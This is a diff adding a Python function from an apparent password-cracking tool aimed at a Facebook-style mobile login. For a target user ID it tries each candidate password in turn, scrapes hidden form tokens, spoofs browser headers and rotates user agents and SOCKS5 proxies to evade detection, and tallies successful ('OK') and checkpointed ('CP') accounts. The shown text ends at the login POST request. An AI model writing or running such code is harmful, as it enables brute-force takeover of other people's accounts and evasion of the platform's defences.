@@ -1,0 +1,54 @@
+def metode2(user, pwx, url):
+	global ok,cp,loop
+	ua = random.choice(uasm)
+	prox = open("data/proxy.txt","r").read().splitlines()
+	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
+	prog.advance(des)
+	for pw in pwx:
+		try:
+			pw = pw.lower()
+			ses=requests.Session()
+			proxy= {"http": "socks5://{random.choice(prox)}"}
+			headers1 = {
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
+				"cache-control": "max-age=0",
+				"referer": f"https://{url}/login/device-based/password/?uid={user}&errorcode=1348092&next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr",
+				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
+				"sec-ch-ua-mobile": "?1",
+				"sec-ch-ua-platform": '"Blackberry"',
+				"sec-fetch-dest": "document",
+				"sec-fetch-mode": "navigate",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-user": "?1",
+				"upgrade-insecure-requests": "1",
+				"user-agent": ua
+			}
+			p = ses.get(f"https://{url}/login/device-based/password/?uid={user}&errorcode=1348092&next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr",headers=headers1)
+			data ={
+				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
+				"uid":user,
+				"next":"https://{url}/login/save-device/",
+				"flow":"login_no_pin",
+				"pass": pw
+			}
+			cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			cookie+=' m_pixel_ratio=2.625; wd=412x756'
+			headers2={
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"accept-encoding": "gzip, deflate, br",
+				"accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
+				"x-requested-with": "mark.via.gp",
+				"cache-control": "max-age=0",
+				"content-type": "application/x-www-form-urlencoded",
+				"origin": "https://"+url,
+				"referer": f"https://{url}/login/device-based/password/?uid={user}&errorcode=1348092&next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr",
+				"sec-fetch-dest": "document",
+				"sec-fetch-mode": "navigate",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-user": "?1",
+				"upgrade-insecure-requests": "1",
+				"user-agent": ua
+			}
+			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0",data=data, headers=headers2, cookies={"cookie":cookie}, proxies=proxy, allow_redirects=False)
